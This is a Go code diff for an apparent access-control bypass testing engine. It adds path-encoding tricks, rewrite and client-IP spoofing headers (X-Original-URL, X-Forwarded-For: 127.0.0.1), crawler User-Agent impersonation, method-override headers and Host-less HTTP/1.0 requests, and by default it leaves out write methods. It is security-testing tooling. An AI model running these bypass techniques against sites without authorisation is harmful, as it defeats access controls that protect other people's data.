@@ -30,8 +30,10 @@ type attemptSpec struct {
 	hostHeader  string            // overrides the Host header/authority; "" means the real host
 	scheme      string            // overrides the connection scheme; "" means the baseline's own
 	// raw routes this attempt through doRawRequest instead of the normal
-	// client -- "http10" for a plain HTTP/1.0 request line, "no-host" for an
-	// HTTP/1.1 request with no Host header at all. "" means the normal path.
+	// client -- "http10" for a plain HTTP/1.0 request line, "http10-no-host"
+	// for HTTP/1.0 with no Host header, "no-host" for an HTTP/1.1 request with
+	// no Host header at all. "" means the normal path (or the raw path for a
+	// "//"-prefixed target, see runAttempt).
 	raw string
 }
 
@@ -60,6 +62,27 @@ func percentEncodeFirst(s string) string {
 	return percentEncodeByte(s[0]) + s[1:]
 }
 
+// percentEncodeLast percent-encodes just the final byte of s -- e.g. "admin"
+// -> "admi%6e". The mirror image of percentEncodeFirst, for rules that anchor
+// on the start of a segment.
+func percentEncodeLast(s string) string {
+	if s == "" {
+		return s
+	}
+	return s[:len(s)-1] + percentEncodeByte(s[len(s)-1])
+}
+
+// percentEncodeAll percent-encodes every byte of s -- e.g. "admin" ->
+// "%61%64%6d%69%6e". Decoders accept it; literal-string rules don't.
+func percentEncodeAll(s string) string {
+	var b strings.Builder
+	// Each byte becomes its own %XX triplet.
+	for i := 0; i < len(s); i++ {
+		b.WriteString(percentEncodeByte(s[i]))
+	}
+	return b.String()
+}
+
 // doublePercentEncodeFirst re-encodes the "%" of percentEncodeFirst's output,
 // e.g. "admin" -> "%2561dmin" -- for the layer one level further out (a proxy
 // that decodes once before a WAF check, with the backend decoding a second
@@ -71,6 +94,7 @@ func doublePercentEncodeFirst(s string) string {
 	return "%25" + percentEncodeFirst(s)[1:]
 }
 
+// percentEncodeByte renders one byte as an uppercase %XX escape.
 func percentEncodeByte(b byte) string {
 	const hex = "0123456789ABCDEF"
 	return string([]byte{'%', hex[b>>4], hex[b&0x0f]})
@@ -80,6 +104,22 @@ func percentEncodeByte(b byte) string {
 // ...) -- see the version-downgrade attempts below.
 var versionSegment = regexp.MustCompile(`^v[0-9]+$`)
 
+// withoutWriteMethods drops every attempt that sends PUT, PATCH or DELETE.
+// Those verbs can overwrite or remove the target's data, so the default run
+// leaves them out. The remaining attempts still cover the method-tampering
+// cases that only read or probe.
+func withoutWriteMethods(specs []attemptSpec) []attemptSpec {
+	out := make([]attemptSpec, 0, len(specs))
+	for _, spec := range specs {
+		switch spec.method {
+		case "PUT", "PATCH", "DELETE":
+			continue
+		}
+		out = append(out, spec)
+	}
+	return out
+}
+
 // buildAttempts lists every technique this engine tries against one target.
 // basePath/query are the baseline request's already-escaped path and raw
 // query (see url.URL.EscapedPath/RawQuery); scheme is the baseline's own
@@ -87,6 +127,10 @@ var versionSegment = regexp.MustCompile(`^v[0-9]+$`)
 // trustedReferer is a same-origin URL to present as Referer -- the closest
 // safe default to "a domain the app already trusts" without this engine
 // having to guess at one.
+//
+// Every technique is a read-style request for the same resource. The method
+// tricks send PUT/POST/PATCH/DELETE with no body -- the only way to test
+// whether a verb-scoped rule is what's blocking a GET.
 func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec {
 	if basePath == "" {
 		basePath = "/"
@@ -109,6 +153,12 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 	// `location` block, a hand-rolled auth check) stops recognizing it, while
 	// whatever actually serves the page still resolves it to the same file.
 	pathAttempt := func(id, desc, path string) {
+		// A request-target has to start with "/" (or be absolute-form); the
+		// tricks built from an empty trimmed root would otherwise send "%20"
+		// or "." on their own, which is not a valid request at all.
+		if !strings.HasPrefix(path, "/") && !strings.HasPrefix(path, "//") {
+			return
+		}
 		attempts = append(attempts, attemptSpec{id: id, category: categoryPath, description: desc, method: "GET", target: withQuery(path)})
 	}
 
@@ -129,8 +179,11 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 	pathAttempt("path-uppercase", "Upper-cased the whole path", strings.ToUpper(basePath))
 	pathAttempt("path-lowercase", "Lower-cased the whole path", strings.ToLower(basePath))
 	pathAttempt("path-encode-first-char", "Percent-encoded the first character of the final path segment", dir+percentEncodeFirst(last))
+	pathAttempt("path-encode-last-char", "Percent-encoded the last character of the final path segment", dir+percentEncodeLast(last))
+	pathAttempt("path-encode-all-chars", "Percent-encoded every character of the final path segment", dir+percentEncodeAll(last))
 	pathAttempt("path-double-encode-first-char", "Double percent-encoded the first character of the final path segment", dir+doublePercentEncodeFirst(last))
 	pathAttempt("path-encoded-dot-prefix", "Prefixed the path with an encoded \".\" segment (/%2e/...)", "/%2e"+basePath)
+	pathAttempt("path-encoded-dotdot-prefix", "Prefixed the path with an encoded \"..\" segment (/%2e%2e/...)", "/%2e%2e"+basePath)
 	pathAttempt("path-double-encoded-dot-prefix", "Prefixed the path with a double percent-encoded \".\" segment (/%252e/...)", "/%252e"+basePath)
 	pathAttempt("path-unicode-slash-prefix", "Prefixed the path with a fullwidth-slash homoglyph (decodes to another \"/\" in some stacks)", "/%ef%bc%8f"+trimmedNoLeadSlash)
 	pathAttempt("path-trailing-space", "Appended a literal encoded space (%20) to the path", trimmedNoSlash+"%20")
@@ -138,7 +191,15 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 	pathAttempt("path-trailing-nul", "Appended a literal encoded NUL byte (%00) to the path", trimmedNoSlash+"%00")
 	pathAttempt("path-trailing-hash", "Appended a literal encoded \"#\" to the path", trimmedNoSlash+"%23")
 	pathAttempt("path-trailing-question", "Appended a literal encoded \"?\" to the path", trimmedNoSlash+"%3f")
+	pathAttempt("path-trailing-dot", "Appended a literal \".\" to the path (Windows and IIS strip trailing dots)", trimmedNoSlash+".")
+	pathAttempt("path-trailing-semicolon", "Appended a bare \";\" to the path", trimmedNoSlash+";")
+	pathAttempt("path-trailing-semicolon-slash", "Appended a \";/\" to the path", trimmedNoSlash+";/")
+	pathAttempt("path-trailing-star", "Appended a \"/*\" wildcard segment", trimmedNoSlash+"/*")
+	pathAttempt("path-trailing-encoded-slash", "Appended an encoded slash (%2f) to the path", trimmedNoSlash+"%2f")
+	pathAttempt("path-trailing-double-encoded-slash", "Appended a double-encoded slash (%252f) to the path", trimmedNoSlash+"%252f")
+	pathAttempt("path-trailing-encoded-backslash", "Appended an encoded backslash (%5c) to the path (IIS treats it as a separator)", trimmedNoSlash+"%5c")
 	pathAttempt("path-json-suffix", "Appended a \".json\" extension (some Ruby routing stacks treat it as a distinct route)", trimmedNoSlash+".json")
+	pathAttempt("path-html-suffix", "Appended a \".html\" extension (some static-file rules match extensions, not the route)", trimmedNoSlash+".html")
 	pathAttempt("path-tilde-suffix", "Appended a \"/~\" suffix", trimmedNoSlash+"/~")
 
 	// Version-downgrade: if the path has a lone "/vN/" segment (an API
@@ -166,21 +227,30 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 	// access-control check further down the chain believe the request
 	// originated somewhere it trusts (an internal rewrite, localhost, a
 	// front-end proxy) instead of from the actual, untrusted client.
-	headerAttempt := func(id, desc string, headers map[string]string) {
-		attempts = append(attempts, attemptSpec{id: id, category: categoryHeader, description: desc, method: "GET", target: originalTarget, headers: headers})
+	headerAttempt := func(id, desc, target string, headers map[string]string) {
+		attempts = append(attempts, attemptSpec{id: id, category: categoryHeader, description: desc, method: "GET", target: target, headers: headers})
 	}
-	headerAttempt("header-x-original-url", "Sent the real path in X-Original-URL against a different request path (some front-ends rewrite off this header)", map[string]string{"X-Original-URL": basePath})
-	headerAttempt("header-x-rewrite-url", "Sent the real path in X-Rewrite-URL", map[string]string{"X-Rewrite-URL": basePath})
-	for _, h := range []string{
+	// Rewrite headers are tried two ways: against the site root (the request
+	// a front-end rewrites to the protected path -- the usual form of this
+	// trick) and against the protected path itself (for a back-end that reads
+	// the header directly).
+	for _, h := range []string{"X-Original-URL", "X-Rewrite-URL", "X-Override-URL"} {
+		headerAttempt("header-"+strings.ToLower(h), "Sent the real path in "+h+" against the site root (front-ends that rewrite on this header route the root request to the protected path)", "/", map[string]string{h: basePath})
+		headerAttempt("header-"+strings.ToLower(h)+"-same-path", "Sent the real path in "+h+" against the protected path itself", originalTarget, map[string]string{h: basePath})
+	}
+	ipHeaders := []string{
 		"X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
 		"X-ProxyUser-Ip", "X-Client-IP", "Client-IP", "True-Client-IP", "Cluster-Client-IP", "X-Custom-IP-Authorization",
-	} {
-		headerAttempt("header-ip-"+strings.ToLower(h), "Claimed to be forwarded from 127.0.0.1 via "+h, map[string]string{h: "127.0.0.1"})
+		"X-Real-IP", "X-Forward-For", "X-Forwarded-By", "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
 	}
-	headerAttempt("header-x-forwarded-host", "Claimed to be forwarded from 127.0.0.1 via X-Forwarded-Host", map[string]string{"X-Forwarded-Host": "127.0.0.1"})
-	headerAttempt("header-user-agent-googlebot", "Presented as Googlebot's User-Agent (some rules allowlist known crawlers)", map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"})
+	for _, h := range ipHeaders {
+		headerAttempt("header-ip-"+strings.ToLower(h), "Claimed to be forwarded from 127.0.0.1 via "+h, originalTarget, map[string]string{h: "127.0.0.1"})
+	}
+	headerAttempt("header-x-forwarded-host", "Claimed to be forwarded from 127.0.0.1 via X-Forwarded-Host", originalTarget, map[string]string{"X-Forwarded-Host": "127.0.0.1"})
+	headerAttempt("header-user-agent-googlebot", "Presented as Googlebot's User-Agent (some rules allowlist known crawlers)", originalTarget, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"})
+	headerAttempt("header-user-agent-bingbot", "Presented as Bingbot's User-Agent (some rules allowlist known crawlers)", originalTarget, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"})
 	if trustedReferer != "" {
-		headerAttempt("header-referer", "Sent a same-origin Referer", map[string]string{"Referer": trustedReferer})
+		headerAttempt("header-referer", "Sent a same-origin Referer", originalTarget, map[string]string{"Referer": trustedReferer})
 	}
 	// Host-header attempts change the *authority* the server is asked to
 	// route for, not a plain header -- doAttempt/doRawRequest keep dialing
@@ -201,8 +271,11 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 	methodAttempt("method-patch", "Retried with PATCH", "PATCH", nil)
 	methodAttempt("method-options", "Retried with OPTIONS", "OPTIONS", nil)
 	methodAttempt("method-trace", "Retried with TRACE (may echo intermediate-proxy headers back)", "TRACE", nil)
+	methodAttempt("method-lowercase-get", "Retried with a lower-cased verb (\"get\"), which some verb-matching rules don't normalize", "get", nil)
 	methodAttempt("method-override-header", "Sent POST with X-HTTP-Method-Override: GET", "POST", map[string]string{"X-HTTP-Method-Override": "GET"})
 	methodAttempt("method-header", "Sent POST with X-HTTP-Method: GET", "POST", map[string]string{"X-HTTP-Method": "GET"})
+	methodAttempt("method-override-x-method-override", "Sent POST with X-Method-Override: GET", "POST", map[string]string{"X-Method-Override": "GET"})
+	methodAttempt("method-override-head", "Sent POST with X-HTTP-Method-Override: HEAD", "POST", map[string]string{"X-HTTP-Method-Override": "HEAD"})
 
 	// --- Protocol tricks: same path and method, a different wire protocol
 	// or scheme in case the access check lives in a layer that only applies
@@ -211,6 +284,11 @@ func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec
 		id: "protocol-http10", category: categoryProtocol,
 		description: "Repeated the request over a plain HTTP/1.0 request line",
 		method:      "GET", target: originalTarget, raw: "http10",
+	})
+	attempts = append(attempts, attemptSpec{
+		id: "protocol-http10-no-host", category: categoryProtocol,
+		description: "Repeated the request over HTTP/1.0 with no Host header",
+		method:      "GET", target: originalTarget, raw: "http10-no-host",
 	})
 	swapped := "https"
 	if scheme == "https" {
